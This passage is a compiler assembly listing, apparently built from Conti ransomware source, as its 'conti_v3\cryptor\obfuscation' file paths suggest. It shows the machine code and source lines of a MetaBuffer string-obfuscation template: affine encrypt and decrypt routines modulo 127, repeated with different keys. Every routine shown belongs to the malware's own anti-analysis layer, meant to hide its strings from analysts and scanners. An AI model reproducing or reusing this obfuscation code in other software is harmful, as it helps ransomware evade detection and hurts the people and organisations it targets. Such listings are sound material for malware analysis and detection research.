?decrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 6b	 imul	 r8d, eax, 107		; 0000006bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 30	 add	 r8d, 48			; 00000030H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0GL@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<107,48,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 19 00 00 00	 mov	 ecx, 25
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 8d 04 c9	 lea	 r8d, DWORD PTR [rcx+rcx*8]
  00013	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00017	41 f7 e8	 imul	 r8d
  0001a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001f	41 03 d0	 add	 edx, r8d
  00022	c1 fa 06	 sar	 edx, 6
  00025	8b ca		 mov	 ecx, edx
  00027	c1 e9 1f	 shr	 ecx, 31
  0002a	03 d1		 add	 edx, ecx
  0002c	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002f	44 2b c1	 sub	 r8d, ecx
  00032	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00036	41 f7 e8	 imul	 r8d
  00039	41 03 d0	 add	 edx, r8d
  0003c	c1 fa 06	 sar	 edx, 6
  0003f	8b ca		 mov	 ecx, edx
  00041	c1 e9 1f	 shr	 ecx, 31
  00044	03 d1		 add	 edx, ecx
  00046	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00049	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0004c	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00050	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 43	 imul	 r8d, eax, 67		; 00000043H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 19	 add	 r8d, 25
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0ED@$0BJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<67,25,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 48 00 00 00	 mov	 ecx, 72			; 00000048H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 2a	 imul	 r8d, ecx, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 c0 18	 add	 eax, 24
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]
  0000a	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000f	41 f7 e0	 mul	 r8d
  00012	41 8b c8	 mov	 ecx, r8d
  00015	2b ca		 sub	 ecx, edx
  00017	d1 e9		 shr	 ecx, 1
  00019	03 ca		 add	 ecx, edx
  0001b	c1 e9 06	 shr	 ecx, 6
  0001e	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00021	44 2b c1	 sub	 r8d, ecx
  00024	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00028	c3		 ret	 0
?encrypt@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$02$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<3,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 15	 sub	 eax, 21
  00006	44 6b c0 1f	 imul	 r8d, eax, 31

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 29	 imul	 r8d, eax, 41		; 00000029H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 15	 add	 r8d, 21
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CJ@$0BF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<41,21,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 52	 sub	 eax, 82			; 00000052H
  00006	44 8d 04 40	 lea	 r8d, DWORD PTR [rax+rax*2]

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 35	 imul	 r8d, eax, 53		; 00000035H
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 52	 add	 r8d, 82			; 00000052H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DF@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<53,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 57	 sub	 eax, 87			; 00000057H
  00006	44 6b c0 1c	 imul	 r8d, eax, 28

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3b	 imul	 r8d, eax, 59		; 0000003bH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 57	 add	 r8d, 87			; 00000057H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DL@$0FH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<59,87,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0HI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
